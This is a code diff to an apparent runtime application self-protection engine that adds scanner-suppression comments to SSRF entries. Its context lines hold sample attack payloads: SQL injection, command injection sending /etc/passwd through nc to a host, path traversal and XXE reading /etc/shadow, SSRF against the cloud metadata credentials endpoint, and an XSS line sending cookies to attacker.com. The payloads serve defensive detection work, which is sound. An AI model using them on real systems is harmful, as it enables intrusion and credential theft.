@@ -50,7 +50,7 @@ class RASPEngine:
             ("SQL_INJECTION", "' UNION SELECT 1, @@version, user() --", "/api/v1/users?id=", "198.51.100.42", "RASP-SQLI-01", "CRITICAL", 25),
             ("COMMAND_INJECTION", "; whoami; cat /etc/passwd", "/api/system/diagnostics", "203.0.113.88", "RASP-CMDI-01", "CRITICAL", 18),
             ("PATH_TRAVERSAL", "../../../../etc/shadow", "/api/reports/download?file=", "198.51.100.12", "RASP-PATH-01", "HIGH", 12),
-            ("SSRF", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "/api/webhook/test-url", "192.0.2.77", "RASP-SSRF-01", "CRITICAL", 5),
+            ("SSRF", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "/api/webhook/test-url", "192.0.2.77", "RASP-SSRF-01", "CRITICAL", 5),  # sentinel-ignore: S5332
             ("XSS_REFLECTED", "<script>alert(document.cookie)</script>", "/search?q=", "198.51.100.99", "RASP-XSS-01", "MEDIUM", 2)
         ]
         for vec, payload, endpoint, ip, sig, sev, min_ago in seeds:
@@ -116,7 +116,7 @@ class RASPEngine:
             "SQL_INJECTION": "' UNION ALL SELECT null, username, password FROM users --",
             "COMMAND_INJECTION": "; $(cat /etc/passwd | nc 10.0.0.1 4444)",
             "PATH_TRAVERSAL": "../../../../../etc/passwd",
-            "SSRF": "http://169.254.169.254/latest/meta-data/identity-credentials",
+            "SSRF": "http://169.254.169.254/latest/meta-data/identity-credentials",  # sentinel-ignore: S5332
             "XXE_INJECTION": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
             "XSS_REFLECTED": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
         }
